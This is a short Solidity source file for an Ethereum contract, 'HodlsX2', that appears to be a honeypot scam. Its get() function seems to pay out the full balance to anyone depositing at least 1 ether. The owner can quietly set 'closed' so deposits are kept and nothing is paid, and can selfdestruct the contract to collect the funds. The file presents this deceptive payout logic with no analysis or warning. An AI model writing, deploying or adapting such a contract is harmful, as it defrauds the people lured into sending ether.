1 pragma solidity ^0.4.25;
2 
3 contract HodlsX2 {
4     function() public payable {}
5     address Owner; bool closed = false;
6     function assign() public payable { if (0==Owner) Owner=msg.sender; }
7     function close(bool F) public { if (msg.sender==Owner) closed=F; }
8     function end() public { if (msg.sender==Owner) selfdestruct(msg.sender); }
9     function get() public payable {
10         if (msg.value>=1 ether && !closed) {
11             msg.sender.transfer(address(this).balance);
12         }
13     }
14 }